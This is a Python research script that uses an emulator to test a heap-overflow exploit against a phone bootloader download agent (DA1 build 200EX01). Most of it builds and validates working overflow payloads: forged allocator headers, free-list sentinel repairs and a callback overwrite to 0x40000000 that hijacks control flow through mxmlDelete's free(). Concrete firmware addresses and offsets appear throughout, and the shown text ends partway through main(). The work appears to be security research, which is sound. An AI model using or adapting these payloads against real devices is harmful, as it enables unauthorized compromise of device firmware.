#!/usr/bin/env python3
"""DA1 200EX01 -- does the fp_read_host_file length desync beat the exact fit?

Question
--------
The fuzz campaign (``docs/notes/da1_fuzz_report.md``) found that the download
loop in ``fp_read_host_file`` (0x2500D8) exits only when the accumulated byte
count ``r7`` equals the declared length ``sb``.  A delivered chunk may be
longer than declared, so the next ``recv`` writes at ``buffer + r7`` -- an
unbounded, fully controlled overflow.

The known HeapBait fire needs the declared length ``L = 0x3C`` exactly:
``load_str`` holds a ``malloc(0x40)`` scratch chunk (chunk size 0x4C) and frees
it last, so ``malloc(L + 4)`` with ``align4(L + 0x10) == 0x4C`` reuses that
hole, and the fake allocator header lands on the first live XML-tree chunk.
The XML tree is then freed by ``mxmlDelete``; ``free()`` writes the fake size
into ``dpc->cb`` (0x2043CC, ``str r1,[r0,#8]`` with ``r0 = 0x2DF79C``).

This script answers: can the extra controlled bytes *repair* whatever the
overflow clobbers (split-remainder node header, tree chunk headers) so the
fire is reached for a declared length that does **not** match the 0x4C hole?

Measured answer (see the PASS/FAIL block)
-----------------------------------------
* ``L > 0x3C`` (needed = align4(L+0x10) > 0x4C): **NO**.  The allocator is
  first-fit and splits a free node from its low end; the command's XML tree is
  allocated *before* the download, therefore every tree chunk is below any
  buffer taken from a *fresh* free node.  For needed > 0x4C the download
  always comes from such a node (the top tail, or a prelude hole), so the
  upward overflow can only reach free space.  ``mxmlDelete`` never calls
  ``free()`` on a fake-headed chunk: the best outcome is ALIVE (repaired free
  list), otherwise CRASH.
* ``L <= 0x3C`` (needed <= 0x4C): **YES, with one repair**.  The download
  reuses the 0x4C scratch hole *below* the tree.  needed <= 0x40 splits it and
  creates a remainder node between the buffer and the tree; overwriting that
  remainder with a sentinel-terminated node (``next = HEAP_HEAD+8``) keeps the
  free-list walk alive, and the fake triple placed at the hole's true user
  capacity (offset 0x40 from the buffer) lands on the first XML-tree chunk.
  The fire then happens exactly as in the exact-fit case.
* So the desync removes only the *declared-length equality* (0x3C), not the
  dependency on the 0x4C scratch hole.  The widened recipe uses two global
  constants (0x2DF79C dpc node, 0x2DF7D8 free-list sentinel) and relative
  offsets -- no runtime heap address.  The heap itself is a compile-time
  array (heap_init: base 0x2E8000, size 0x10000), so this is deterministic
  across the prelude (the committed geometry study showed the same 0x4C hole
  for 10/10 preludes); the exact constants are 200EX01 build constants.

Method
------
* Exploit runs reuse the proven probe path: ``da1_fixed_stage.boot`` + the
  committed ``da1_fuzz.ScriptedHost``/``execute`` in ``proto_dram`` mode (the
  real ``DRAM-REPAIR`` handler, fixed host frame list, ``blx r4`` intercepted
  by the fuzz harness so ``dpc->cb`` is observed, not executed).
* Every configuration is executed ``--runs`` times on a fresh emulator
  (default 5); the run tokens must be byte-identical for the determinism
  column.
* ``dpc->cb`` read from memory after the handler is the fire evidence
  (``0x40000000`` = BOOT-TO staging address, the real chain target).
* A layout probe in the *same* direct-handler mode snapshots the free list at
  the download ``malloc`` entry and records every current-command allocation
  above the buffer.  A second probe reuses the committed
  ``da1_geometry_study.run_case/VARIANTS`` to repeat that count across all ten
  device preludes.

Usage
-----
    /tmp/opencode/da1venv/bin/python docs/notes/da1_desync_chain.py \
        --image docs/notes/rmx3630-da2/da1_allinone.bin

    --runs N        repetitions per configuration (default 5)
    --quick         control + one representative of each theory class
    --no-preludes   skip the 10-prelude geometry cross-check
    --json PATH     write the full machine-readable result

Exit code is 0 when every acceptance check in the PASS/FAIL block passes,
1 otherwise.  The script never touches a device and never writes to the repo.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import unicorn.arm_const as ac                              # noqa: E402
from unicorn import UC_HOOK_CODE                            # noqa: E402

from da1_emu import (                                       # noqa: E402
    DPC_STRUCT, HEAP_INIT, MALLOC, SESSION, DRAM_REPAIR,
    HEAP_HEAD, STACK_TOP, TRAMP_TRAP,
)
from da1_fixed_stage import (                               # noqa: E402
    FS_STAGE, FORGED_NODE, FAKE_MAGIC, CMD_XML, XML_ADDR,
    boot, make_payload,
)
from da1_fuzz import ScriptedHost, execute                  # noqa: E402
from da1_geometry_study import PARSE_CHUNK                  # noqa: E402
from da1_heap_sweep import CHUNK_HDR, _safe_free_list        # noqa: E402

# ---------------------------------------------------------------------------
# constants (all 200EX01 build constants -- no heap address)
# ---------------------------------------------------------------------------
SENTINEL = (HEAP_HEAD + 8) & 0xFFFFFFFF     # 0x2DF7D8: free-list sentinel
HOLE = PARSE_CHUNK                          # 0x4C: load_str malloc(0x40) chunk
HOLE_CAP = HOLE - CHUNK_HDR                 # 0x40: user capacity of that hole
CB_TARGET = FS_STAGE                        # 0x40000000: fire value under test
HEAP_BASE = 0x2E8000                        # heap_init movw/movt
HEAP_END = 0x2F8000                         # heap_init size 0x10000
IMAGE_LO, IMAGE_HI = 0x200000, 0x280000     # DA1 image window (VA = 0x200000+off)
DOWNLOAD_MALLOC_LR = 0x250324               # `bl malloc` inside fp_read_host_file
MALLOC_OK_RET = 0x204308                    # malloc epilogue (r0 = user pointer)
TREE_NODE_LR = 0x204C5C                     # mxml node allocator
TREE_STR_LR = 0x20933C                      # mxml string/value allocator
TREE_LRS = (TREE_NODE_LR, TREE_STR_LR)
PIECE_SAFE = 0xB                            # 11: no prefix sum hits our L set
PIECE_EARLY = 0x10                          # divides L -> loop exits at declared


def _a4(value: int) -> int:
    return (value + 3) & ~3


def _hdr(prev: int, nxt: int, size: int) -> bytes:
    return struct.pack("<III", prev, nxt, size)


def _fake(cb: int = CB_TARGET) -> bytes:
    return _hdr(FAKE_MAGIC, FORGED_NODE, cb)


def frames_for(L: int, payload: bytes, piece: int | None = None) -> list[bytes]:
    """Exact download frames: ``OK``, ``OK@L``, one ``OK`` ack per data chunk.

    The DA recv loop consumes one frame per ``recv``: an ``OK`` chunk-ack,
    then the data slice.  A slice boundary that lands on ``r7 == L`` makes the
    loop exit *successfully* before the rest of the payload is delivered, so
    callers that want the overflow use a piece size that never produces a
    prefix sum equal to L (checked in ``_prefix_hits``).
    """
    frames = [b"OK\x00", b"OK@0x%x\x00" % L, b"OK\x00"]
    size = len(payload) if piece is None else piece
    pos = 0
    while pos < len(payload):
        n = min(size, len(payload) - pos)
        frames.append(payload[pos:pos + n])
        pos += n
        if pos < len(payload):
            frames.append(b"OK\x00")
    return frames


def _prefix_hits(L: int, total: int, piece: int) -> bool:
    return any(k * piece == L for k in range(1, total // piece + 2))


# ---------------------------------------------------------------------------
# payload constructors
# ---------------------------------------------------------------------------
def split_repair_payload(L: int, cb: int = CB_TARGET) -> bytes:
    """needed <= 0x4C: reuse the 0x4C hole; repair a split remainder.

    * If needed < 0x40 the allocator splits the hole and inserts a remainder
      node at ``D + needed - 0xC``.  The overflow walks over that header, so
      it is rewritten as a sentinel-terminated free node
      ``{SENTINEL, SENTINEL, size}`` -- the walk stops there and every later
      insert is appended through the valid sentinel links.
    * The fake triple goes at the hole's *true* user capacity (offset 0x40),
      which is the header of the first live XML-tree chunk.
    """
    needed = _a4(L + 0x10)
    if needed > HOLE:
        raise ValueError(f"L={L:#x} does not reuse the 0x4C hole")
    buf = bytearray(HOLE)
    if needed < HOLE_CAP:                       # hole split -> remainder exists
        off = needed - CHUNK_HDR
        buf[off:off + CHUNK_HDR] = _hdr(SENTINEL, SENTINEL, HOLE - needed)
    buf[HOLE_CAP:HOLE] = _fake(cb)
    return bytes(buf)


def split_no_repair_payload(L: int, cb: int = CB_TARGET) -> bytes:
    """Same placement as ``split_repair_payload`` but the remainder stays 0."""
    needed = _a4(L + 0x10)
    buf = bytearray(HOLE)
    if needed > HOLE:
        raise ValueError(f"L={L:#x} does not reuse the 0x4C hole")
    buf[HOLE_CAP:HOLE] = _fake(cb)
    return bytes(buf)


def capacity_payload(L: int, cb: int = CB_TARGET) -> bytes:
    """The committed exact-fit helper, i.e. fake triple at ``needed-0xC``.

    For L != 0x3C this is *inside* the buffer or on the split remainder -- the
    negative control showing that the header must move to the true chunk end.
    """
    return make_payload(L, cb)


def long_exact_payload(n: int, cb: int = CB_TARGET) -> bytes:
    """L=0x3C (exact fit) with an ``n``-byte chunk and 'A' past the header.

    Reproduces the campaign observation: 0x50 (4-byte overshoot) still fires,
    while 0x60/0x80/0x100/0x200 overwrite the first mxml node's data and
    abort in mxmlDelete at PC 0x20872C before any free() reaches the fake
    allocator header.
    """
    if n < HOLE_CAP + CHUNK_HDR:
        raise ValueError("chunk shorter than the fake header")
    buf = bytearray(n)
    buf[HOLE_CAP:HOLE_CAP + CHUNK_HDR] = _fake(cb)
    for i in range(HOLE_CAP + CHUNK_HDR, n):
        buf[i] = 0x41
    return bytes(buf)


def _hole_extra(total: int, off: int, data: bytes) -> bytearray:
    buf = bytearray(max(total, off + len(data)))
    buf[off:off + len(data)] = data
    return buf


def case1_payload(L: int, kind: str, cb: int = CB_TARGET) -> bytes:
    """needed > 0x4C: buffer comes from a fresh node above every tree chunk."""
    needed = _a4(L + 0x10)
    base = needed - CHUNK_HDR                    # split-remainder header offset
    if kind == "repair":
        # Only the remainder is repaired; the rest is zero.  no fake triple.
        return bytes(_hole_extra(needed, base,
                                 _hdr(SENTINEL, SENTINEL, 0x1000)))
    if kind == "fake-on-remainder":
        return bytes(_hole_extra(needed, base, _fake(cb)))
    if kind == "repair+fake-above":
        # The first byte region above the remainder is free tail space (in
        # P0 it runs to HEAP_END): no chunk header will ever be freed there.
        buf = _hole_extra(needed, base, _hdr(SENTINEL, SENTINEL, 0x1000))
        buf += _fake(cb)
        return bytes(buf)
    if kind == "long-0x200":
        # Probe-style 0x200 delivery.  If the fake triple still fits before
        # offset 0x200 it is written; a 0x400-needed split is not reached.
        buf = bytearray(0x200)
        if base + CHUNK_HDR <= len(buf):
            buf[base:base + CHUNK_HDR] = _fake(cb)
        return bytes(buf)
    raise ValueError(f"unknown case1 kind {kind!r}")


# ---------------------------------------------------------------------------
# configs
# ---------------------------------------------------------------------------
class Config:
    def __init__(self, cid, group, L, payload, piece, expect, note,
                 expect_cb=CB_TARGET, expect_prefix=None):
        self.cid = cid
        self.group = group
        self.L = L
        self.payload = payload
        self.piece = piece
        self.expect = expect                     # "FIRE" | "NOFIRE"
        self.expect_cb = expect_cb
        self.expect_prefix = expect_prefix       # optional token prefix
        self.note = note
        self.address_free = payload_is_address_free(payload)

    @property
    def mode(self):
        return "single" if self.piece is None else f"piece=0x{self.piece:x}"


def payload_is_address_free(payload: bytes) -> bool:
    """True when no 4-byte window is a heap pointer or a DA image pointer.

    Global .bss constants (0x2DF79C / 0x2DF7D8) and 0x40000000 are fine: they
    are build constants, not allocations.  Only *runtime heap addresses*
    ([0x2E8000,0x2F8000)) would make the payload address-dependent, so the
    heap window is scanned at every byte offset (an overflow can write at any
    alignment).  The image window is checked only on 4-byte-aligned words: a
    real code pointer is aligned, while an unaligned window can coincide with
    e.g. 0x24002D (``.. 2D 00 24 00``) purely from a sentinel/size pair.
    """
    for off in range(0, max(0, len(payload) - 3)):
        word = struct.unpack_from("<I", payload, off)[0]
        if HEAP_BASE <= word < HEAP_END:
            return False
        if off % 4 == 0 and IMAGE_LO <= word < IMAGE_HI:
            return False
    return True


RELAX_LS = (0x4, 0x8, 0xC, 0x10, 0x18, 0x20, 0x28, 0x2C, 0x30, 0x34, 0x38)
CASE1_LS = (0x40, 0x50, 0x100, 0x400)


def build_configs(quick: bool = False) -> list[Config]:
    cfgs: list[Config] = []

    # -- control: the committed, known-good exact-fit fire -------------------
    cfgs.append(Config(
        "CONTROL exact-fit", "control", 0x3C, make_payload(0x3C, CB_TARGET),
        None, "FIRE",
        "committed make_payload; known PASS reference"))

    # -- relaxed declared length: hole reused, split remainder repaired ------
    relax = RELAX_LS if not quick else (0x10, 0x30)
    for L in relax:
        cfgs.append(Config(
            f"RELAX repair L={L:#x}", "relax", L, split_repair_payload(L),
            None, "FIRE",
            "desync: needed<=0x4C, remainder sentinel-terminated",
            expect_cb=CB_TARGET))

    # -- positive controls: without the repair / at the wrong offset ---------
    for L in ((0x10, 0x20) if not quick else (0x10,)):
        cfgs.append(Config(
            f"NEG no-repair L={L:#x}", "neg-repair", L,
            split_no_repair_payload(L), None, "NOFIRE",
            "walk reaches the zeroed split remainder -> abort"))
    for L in ((0x10, 0x20, 0x30) if not quick else (0x10, 0x30)):
        cfgs.append(Config(
            f"NEG capacity L={L:#x}", "neg-placement", L,
            capacity_payload(L), None, "NOFIRE",
            "fake triple at needed-0xC, not at the true chunk end"))

    # -- case 1: needed > 0x4C ----------------------------------------------
    case1_ls = CASE1_LS if not quick else (0x40, 0x100)
    kinds = ("repair", "fake-on-remainder", "repair+fake-above", "long-0x200")
    for L in case1_ls:
        for kind in kinds:
            cfgs.append(Config(
                f"C1 {kind} L={L:#x}", "case1", L, case1_payload(L, kind),
                None, "NOFIRE",
                "buffer above every live tree chunk: no free() sees the fake"))

    # -- case 3: multi-recv-round delivery + reconstructed free list --------
    for L in ((0x40, 0x50, 0x100) if not quick else (0x40,)):
        cfgs.append(Config(
            f"C3 repair multi L={L:#x}", "case3", L,
            case1_payload(L, "repair"), PIECE_SAFE, "NOFIRE",
            "multi-round, remainder repaired, free list walkable"))
    for L in ((0x10, 0x20, 0x30) if not quick else (0x10,)):
        cfgs.append(Config(
            f"MULTI repair L={L:#x}", "multi", L,
            split_repair_payload(L), PIECE_SAFE, "FIRE",
            "same fire, delivered over several recv rounds"))

    # -- history: reproduce the campaign's long-chunk observations -----------
    if not quick:
        cfgs.append(Config(
            "HIST long 0x50 L=0x3c", "history", 0x3C,
            long_exact_payload(0x50), None, "FIRE",
            "4-byte overshoot still fires (campaign F5)"))
        for n in (0x60, 0x100, 0x200):
            cfgs.append(Config(
                f"HIST long {n:#x} L=0x3c", "history", 0x3C,
                long_exact_payload(n), None, "NOFIRE",
                "mxml node data clobbered -> abort at 0x20872C",
                expect_prefix="CRASH:20872c@"))

    # 5. history: the campaign's 0x20872C long-chunk abort reproduced
    #    (evaluated in evaluate(), configs built above)

    # -- early-exit control: a slice boundary equal to declared --------------
    for L in ((0x40, 0x100) if not quick else (0x40,)):
        cfgs.append(Config(
            f"EARLY piece=declared L={L:#x}", "early", L,
            case1_payload(L, "repair"), PIECE_EARLY, "NOFIRE",
            "loop exits at r7==L before the overflow -> ALIVE rc=0",
            expect_prefix="ALIVE:00000000"))

    return cfgs


# ---------------------------------------------------------------------------
# one measured configuration
# ---------------------------------------------------------------------------
def _token(rec: dict) -> tuple[str, int | None, int | None, int | None]:
    """(verdict-class, cb, fault_pc, fault_addr) from a fuzz-harness record."""
    cb = rec["cb_at_blx"] if rec["cb_at_blx"] is not None else rec["cb_after"]
    verdict = rec["verdict"]
    if verdict == "CB_SET" and cb:
        return "FIRE", cb, None, None
    if verdict in ("DATA_ABORT", "UNMAPPED_IO"):
        return "CRASH", cb or 0, rec["fault_pc"], rec["fault_addr"]
    if verdict == "HANG":
        return "HANG", cb or 0, rec["fault_pc"], rec["fault_addr"]
    if verdict in ("OK_RC", "ERR_RC"):
        return "ALIVE", cb or 0, None, rec["rc"]
    return "ERROR", cb or 0, rec["fault_pc"], rec["fault_addr"]


def _token_text(tok) -> str:
    kind, cb, pc, extra = tok
    if kind == "FIRE":
        return f"FIRE:{cb:08x}"
    if kind == "CRASH":
        return f"CRASH:{(pc or 0):06x}" + (f"@{(extra or 0):08x}" if pc else "")
    if kind == "ALIVE":
        return f"ALIVE:{(extra or 0):08x}"
    if kind == "HANG":
        return "HANG"
    return "ERROR"


def run_config(image: str, cfg: Config, runs: int) -> dict:
    frames = frames_for(cfg.L, cfg.payload, cfg.piece)
    spec = {"mode": "proto_dram", "declared": cfg.L,
            "delivered": len(cfg.payload), "frames": frames}
    records = [execute(spec, image) for _ in range(runs)]
    tokens = [_token(r) for r in records]
    texts = [_token_text(t) for t in tokens]
    fires = sum(1 for t in tokens if t[0] == "FIRE")
    deterministic = len(set(texts)) == 1
    return {
        "id": cfg.cid, "group": cfg.group, "L": cfg.L,
        "payload_len": len(cfg.payload), "piece": cfg.piece,
        "mode": cfg.mode, "runs": runs,
        "tokens": texts, "deterministic": deterministic,
        "fires": fires, "expect": cfg.expect,
        "expect_cb": cfg.expect_cb, "expect_prefix": cfg.expect_prefix,
        "address_free": cfg.address_free, "note": cfg.note,
        "runs_raw": [{"verdict": r["verdict"], "rc": r["rc"],
                      "cb": r["cb_at_blx"] if r["cb_at_blx"] is not None
                      else r["cb_after"],
                      "fault_pc": r["fault_pc"],
                      "fault_addr": r["fault_addr"],
                      "stop": r["stop"]} for r in records],
    }


# ---------------------------------------------------------------------------
# layout probe: is there any live chunk above the download buffer?
# ---------------------------------------------------------------------------
def _call(emu, addr: int, args=(), max_insn: int = 10_000_000):
    """Local run helper (same contract as da1_fuzz._run, no private import)."""
    uc = emu.uc
    for i, v in enumerate(args[:4]):
        uc.reg_write([ac.UC_ARM_REG_R0, ac.UC_ARM_REG_R1,
                      ac.UC_ARM_REG_R2, ac.UC_ARM_REG_R3][i], v)
    uc.reg_write(ac.UC_ARM_REG_LR, TRAMP_TRAP)
    uc.reg_write(ac.UC_ARM_REG_SP, STACK_TOP)
    emu._ret = False
    err = None
    try:
        uc.emu_start(addr, 0, count=max_insn)
    except Exception as exc:                       # UcError / budget trip
        err = exc
    return {"err": err, "returned": bool(emu._ret),
            "pc": uc.reg_read(ac.UC_ARM_REG_PC)}


def probe_layout(image: str, L: int) -> dict:
    """Snapshot the heap at the download malloc in the direct-handler mode.

    No data chunk is delivered: the download times out and the handler frees
    the untouched XML tree, so the probe itself is safe.  The useful data is
    the free list at malloc entry and every allocation the *current* command
    made above the chosen buffer.
    """
    emu = boot(image)
    emu.write_bytes(XML_ADDR, CMD_XML)
    emu.write_bytes(DPC_STRUCT, b"\x00" * 12)
    # only the handshake: the data recv then times out
    emu.on_send = ScriptedHost(emu, [b"OK\x00", b"OK@0x%x\x00" % L,
                                    b"OK\x00"]).on_send
    rec = {"D": None, "fl_at_malloc": [], "allocs": []}
    gate = {}

    def on_malloc_entry(uc, a, s, u):
        lr = uc.reg_read(ac.UC_ARM_REG_LR)
        if lr == DOWNLOAD_MALLOC_LR:
            rec["fl_at_malloc"] = [(n, z) for n, z in _safe_free_list(emu)]
        gate["lr"] = lr

    def on_malloc_ret(uc, a, s, u):
        if "lr" in gate:
            lr = gate.pop("lr")
            ptr = uc.reg_read(ac.UC_ARM_REG_R0)
            rec["allocs"].append((ptr, lr))
            if lr == DOWNLOAD_MALLOC_LR:
                rec["D"] = ptr
        gate.clear()

    emu.uc.hook_add(UC_HOOK_CODE, on_malloc_entry, begin=MALLOC, end=MALLOC)
    emu.uc.hook_add(UC_HOOK_CODE, on_malloc_ret, begin=MALLOC_OK_RET,
                    end=MALLOC_OK_RET)
    emu.budget["hits"] = 0
    emu.budget["hit"] = False
    run = _call(emu, DRAM_REPAIR, [SESSION, XML_ADDR])

    D = rec["D"]
    needed = _a4(L + 0x10)
    node = D - CHUNK_HDR if D else None
    chosen = None
    for addr, size in rec["fl_at_malloc"]:
        if D and addr <= node < addr + size:
            chosen = (addr, size)
            break
    split = bool(chosen and chosen[1] > needed + CHUNK_HDR)
    remainder = node + needed if split else None
    above_remainder = (chosen[0] + chosen[1]) if split else None
    above = [(p, lr) for (p, lr) in rec["allocs"]
             if p and D and p > D]
    tree_above = [p for (p, lr) in above if lr in TREE_LRS]
    # the first chunk header after the split remainder, if it is an allocation
    first_alloc_above_rem = None
    if above_remainder is not None:
        for p, _lr in rec["allocs"]:
            if p and p - CHUNK_HDR == above_remainder:
                first_alloc_above_rem = p
                break
    return {
        "L": L, "needed": needed, "D": D,
        "chosen_node": chosen[0] if chosen else None,
        "chosen_size": chosen[1] if chosen else None,
        "hole_reused": bool(chosen and chosen[1] == HOLE and
                            chosen[0] == node),
        "split": split, "remainder": remainder,
        "remainder_ends": above_remainder,
        "remainder_hits_heap_end": (above_remainder == HEAP_END
                                    if above_remainder else False),
        "first_alloc_above_remainder": first_alloc_above_rem,
        "allocations_above_D": len(above),
        "tree_chunks_above_D": len(tree_above),
        "returned": run["returned"], "crashed": run["err"] is not None,
        "pc": run["pc"],
    }


def probe_preludes(image: str, Ls=(0x20, 0x40, 0x100)) -> list[dict]:
    """Repeat the key layout count across the 10 device preludes.

    Reuses the committed ``da1_geometry_study.VARIANTS`` and ``run_case``;
    the fields used here are recorded before any exploit payload is delivered.
    """
    try:
        from da1_geometry_study import run_case, VARIANTS
    except Exception as exc:                       # pragma: no cover
        return [{"error": str(exc)}]
    rows = []
    for L in Ls:
        for name, _desc, ops in VARIANTS:
            rec = run_case(image, L, ops,
                           needs_hwinfo=any(o[0] == "hwinfo" for o in ops))
            D = rec["D"]
            tree_above = [p for (_q, p, lr) in rec["allocs"]
                          if p and D and p > D and lr in TREE_LRS]
            rows.append({
                "L": L, "prelude": name, "D": D,
                "chunk": rec["chunk"], "delta": rec.get("delta"),
                "tree_chunks_above_D": len(tree_above),
                "allocs_above_D": len([1 for (_q, p, _l) in rec["allocs"]
                                       if p and D and p > D]),
            })
    return rows


# ---------------------------------------------------------------------------
# reporting
# ---------------------------------------------------------------------------
def _hex(v):
    return "-" if v is None else f"0x{v:x}"


def print_layout(rows: list[dict]):
    print("\n== layout probe (direct-handler mode, snapshot at download malloc) ==")
    print("The decisive number is how many current-command XML-tree chunks sit "
          "ABOVE the download buffer:")
    print("  > 0  -> the overflow can reach a live mxml header (fire possible)")
    print("  = 0  -> it can only reach free space (no free() ever sees the fake)")
    print(f"{'L':>7} {'needed':>7} {'D':>10} {'node_size':>10} {'hole':>5} "
          f"{'split':>5} {'rem_ends':>10} {'tree_above':>10} {'all_above':>9} "
          f"{'1st_alloc_above_rem':>20}")
    for r in rows:
        print(f"0x{r['L']:05x} 0x{r['needed']:05x} {_hex(r['D']):>10} "
              f"{_hex(r['chosen_size']):>10} {str(r['hole_reused']):>5} "
              f"{str(r['split']):>5} {_hex(r['remainder_ends']):>10} "
              f"{r['tree_chunks_above_D']:>10} {r['allocations_above_D']:>9} "
              f"{_hex(r['first_alloc_above_remainder']):>20}")


def print_det_table(results: list[dict]):
    print("\n== determinism table (config x runs) ==")
    print(f"{'#':>2}  {'config':30s} {'L':>6} {'mode':10s} {'runs':>4}  "
          f"{'per-run outcome':40s} {'det':>3} {'fire':>5} {'addr-free':>9}")
    for i, r in enumerate(results, 1):
        if r["deterministic"]:
            outcome = f"{r['tokens'][0]} x{r['runs']}"
        else:
            outcome = " ".join(r["tokens"])
        if len(outcome) > 40:
            outcome = outcome[:37] + "..."
        print(f"{i:>2}  {r['id']:30s} 0x{r['L']:04x} {r['mode']:10s} "
              f"{r['runs']:>4}  {outcome:40s} "
              f"{'yes' if r['deterministic'] else 'NO':>3} "
              f"{r['fires']:>2}/{r['runs']:<2} "
              f"{'yes' if r['address_free'] else 'NO':>9}")
    print("(FIRE:cb = dpc->cb value; CRASH:pc@fault = stop PC and faulting "
          "address; ALIVE:rc = handler return)")


def evaluate(results: list[dict], layout: list[dict],
             preludes: list[dict]) -> list[tuple[bool, str, str]]:
    checks: list[tuple[bool, str, str]] = []

    def add(name, ok, detail):
        checks.append((bool(ok), name, detail))

    # 1. known exact-fit control
    ctl = [r for r in results if r["group"] == "control"]
    ok = bool(ctl) and all(r["fires"] == r["runs"] and r["deterministic"]
                           and r["tokens"][0] == f"FIRE:{CB_TARGET:08x}"
                           for r in ctl)
    add("control-exact-fit", ok,
        f"{ctl[0]['fires']}/{ctl[0]['runs']} FIRE "
        f"{ctl[0]['tokens'][0]}" if ctl else "missing")

    # 2. widened declared-length window (the positive result)
    relax = [r for r in results if r["group"] in ("relax", "multi")]
    bad = [r["id"] for r in relax if r["fires"] != r["runs"]
           or not r["deterministic"]
           or any(t != f"FIRE:{CB_TARGET:08x}" for t in r["tokens"])]
    add("relax-window-fire", not bad,
        f"{len(relax)} configs x {relax[0]['runs']} runs all FIRE "
        f"cb=0x{CB_TARGET:08x}" if not bad else f"failed: {bad}")

    # 3. repair is what makes the split case survive (negative control)
    neg = [r for r in results if r["group"] in ("neg-repair", "neg-placement")]
    bad = [r["id"] for r in neg if r["fires"]]
    add("repair-and-placement-matter", not bad,
        f"{len(neg)} negative controls: 0 fire" if not bad
        else f"unexpected fire: {bad}")

    # 4. case 1 / case 3: needed > 0x4C must never fire
    c1 = [r for r in results if r["group"] in ("case1", "case3")]
    bad = [r["id"] for r in c1 if r["fires"]]
    add("no-fire-above-0x4c", not bad,
        f"{len(c1)} configs x {c1[0]['runs']} runs: 0 fire "
        f"(CRASH or ALIVE only)" if not bad else f"unexpected fire: {bad}")

    # 5. history: the campaign's 0x20872C long-chunk abort reproduced
    hist = [r for r in results if r["group"] == "history"]
    if hist:
        short = [r for r in hist if r["id"].endswith("0x50 L=0x3c")]
        longs = [r for r in hist if r not in short]
        ok = (bool(short) and all(r["fires"] == r["runs"] for r in short)
              and bool(longs)
              and all(r["fires"] == 0 and r["deterministic"]
                      and all(t.startswith("CRASH:20872c@") for t in r["tokens"])
                      for r in longs))
        add("history-long-chunk", ok,
            "L=0x3C: 0x50 fires, 0x60/0x100/0x200 abort at "
            "0x20872C (mxmlDelete) with cb untouched")

    # 6. early exit at the declared boundary (shows why a chosen offset matters)
    early = [r for r in results if r["group"] == "early"]
    ok = bool(early) and all(
        r["fires"] == 0 and r["deterministic"]
        and all(t.startswith(r["expect_prefix"] or "ALIVE")
                for t in r["tokens"]) for r in early)
    add("early-exit-at-declared", ok,
        "; ".join(f"{r['id']}: {r['tokens'][0]}" for r in early))

    # 6. determinism everywhere
    bad = [r["id"] for r in results if not r["deterministic"]]
    add("deterministic-runs", not bad,
        f"all {len(results)} configs identical across "
        f"{results[0]['runs']} fresh-emulator runs" if not bad
        else f"non-deterministic: {bad}")

    # 7. no hangs / harness errors
    bad = [r["id"] for r in results
           if any(t.startswith(("HANG", "ERROR")) for t in r["tokens"])]
    add("no-hang-or-harness-error", not bad,
        "0 HANG / 0 ERROR" if not bad else f"bad: {bad}")

    # 8. working payloads contain no runtime heap or code pointer
    work = [r for r in results if r["fires"]]
    bad = [r["id"] for r in work if not r["address_free"]]
    add("fire-payloads-address-free", not bad,
        f"{len(work)} firing configs use constants only "
        f"(fp=0x2DF79C, sentinel=0x2DF7D8, cb=0x{CB_TARGET:08x}, offsets)"
        if not bad else f"address-dependent: {bad}")

    # 9. layout: current tree above the buffer iff L <= 0x3C
    by_l = {}
    for r in layout:
        by_l[r["L"]] = r
    small = [r for L, r in by_l.items() if L <= 0x3C]
    big = [r for L, r in by_l.items() if L > 0x3C]
    ok = (bool(small) and bool(big)
          and all(r["tree_chunks_above_D"] > 0 for r in small)
          and all(r["tree_chunks_above_D"] == 0 for r in big))
    add("layout-tree-side", ok,
        "L<=0x3C: tree above D; L>0x3C: 0 tree chunks above D "
        f"({', '.join(f'L={hex(L)}:{by_l[L]['tree_chunks_above_D']}' for L in sorted(by_l))})")

    # 10. the same invariant across the ten committed preludes
    good = [p for p in preludes if "error" not in p]
    if good:
        small = [p for p in good if p["L"] <= 0x3C]
        big = [p for p in good if p["L"] > 0x3C]
        ok = (all(p["tree_chunks_above_D"] > 0 for p in small)
              and all(p["tree_chunks_above_D"] == 0 for p in big))
        add("layout-prelude-independent", ok,
            f"{len(good)} prelude rows: L<=0x3C fire-capable, "
            f"L>0x3C has 0 current tree chunks above D")
    return checks


def print_verdict(checks) -> str:
    print("\n== PASS/FAIL ==")
    all_ok = True
    for ok, name, detail in checks:
        all_ok &= ok
        print(f"{'PASS' if ok else 'FAIL'} {name:34s} {detail}")
    print("\n== HONEST VERDICT ==")
    print(
        "The desync does NOT remove the exact-fit dependency on the 0x4C hole.\n"
        "It removes the *declared-length equality*: any L with\n"
        "align4(L+0x10) <= 0x4C (measured: 0x4 .. 0x3C) now fires, whereas the\n"
        "committed HeapBait needed exactly L=0x3C.\n"
        "  - L <= 0x3C: the download reuses load_str's freed 0x4C scratch hole\n"
        "    below the XML tree. If the hole is split (needed < 0x40) the\n"
        "    overflow must repair the remainder node with the sentinel\n"
        "    0x2DF7D8, then the fake triple at the hole's true capacity (0x40)\n"
        "    hits the first live tree chunk and mxmlDelete's free() fires cb.\n"
        "  - L > 0x3C (needed > 0x4C): impossible in this command path. The\n"
        "    allocator is first-fit and splits from the low end; the XML tree\n"
        "    is allocated before the download, so the download always comes\n"
        "    from a free node ABOVE every tree chunk. The upward overflow can\n"
        "    only reach free space (the split remainder / top tail). Repairing\n"
        "    that free list turns CRASH into ALIVE, but no free() ever sees a\n"
        "    fake header, so mxmlDelete cannot reach the fire.\n"
        "Determinism: the widened payload contains NO heap address -- only the\n"
        "globals 0x2DF79C (dpc node) and 0x2DF7D8 (sentinel), the fire value\n"
        "0x40000000, and offsets. heap_init's base 0x2E8000 is a compile-time\n"
        "constant, and the committed geometry study proved the 0x4C hole is\n"
        "prelude-independent (10/10); the same check is repeated here. So the\n"
        "layout is build-deterministic and needs no runtime address, but it is\n"
        "not build-independent: the 0x40 capacity offset and 0x4C hole are\n"
        "200EX01 constants and must be re-measured for another DA build."
    )
    return "PASS" if all_ok else "FAIL"


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="DA1 length-desync vs the HeapBait exact fit")
    ap.add_argument("--image", default=os.path.join(
        _HERE, "rmx3630-da2", "da1_allinone.bin"))
    ap.add_argument("--runs", type=int, default=5,
                    help="repetitions per configuration (default 5)")
    ap.add_argument("--quick", action="store_true",
                    help="control + one representative per theory class")
    ap.add_argument("--no-preludes", action="store_true",
                    help="skip the 10-prelude geometry cross-check")
    ap.add_argument("--json", default=None,
                    help="write the full machine-readable result")
